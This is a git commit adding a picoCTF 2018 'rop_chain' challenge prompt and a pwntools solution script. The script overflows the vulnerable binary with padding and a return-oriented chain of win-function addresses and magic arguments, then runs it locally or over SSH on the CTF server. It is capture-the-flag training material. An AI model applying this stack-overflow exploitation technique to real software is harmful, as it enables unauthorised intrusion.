26f486a383dcb4bd410fe9e76ed94580164f7bb1
Mikael Kall <Mikael.Kall@kindredgroup.com>
2019-04-28 16:27:16 +0200

    Added rop

---
+++ picoctf2018/rop_chain/README.md
@@ -0,0 +1,1 @@
+Can you exploit the following program and get the flag? You can findi the program in /problems/rop-chain_3_f91334c5acb91bde3de858eb8045928a on the shell server? Source. 
---
+++ picoctf2018/rop_chain/solution.py
@@ -0,0 +1,37 @@
+#!/usr/bin/env python2
+from pwn import *
+import os
+import commands
+
+# Get password from password manager
+USERNAME='nighter'
+PASSWORD=commands.getoutput('pass picoctf2018/nighter')
+
+# Payload settings
+vuln = ELF('./rop')
+deadbaad = p32(0xDEADBAAD)
+baaaaaad = p32(0xBAAAAAAD)
+winaddr1 = p32(vuln.symbols['win_function1'])
+winaddr2 = p32(vuln.symbols['win_function2'])
+flag = p32(vuln.symbols['flag'])
+
+padding = 'A' * 28
+payload = padding + winaddr1 + winaddr2 + flag + baaaaaad + deadbaad
+
+# Run local
+def local():
+	io = vuln.process()
+	io.readuntil('Enter your input>')
+	io.sendline(payload)
+	print(io.recvall())
+
+def remote():
+	s = ssh(host='2018shell1.picoctf.com', user=USERNAME, password=PASSWORD)
+	io = s.run('cd /problems/rop-chain_3_f91334c5acb91bde3de858eb8045928a; ./rop')
+	print(io.recv())
+	io.sendline(payload)
+	print(io.recv())
+	s.close()
+
+if __name__ == '__main__':
+	remote()
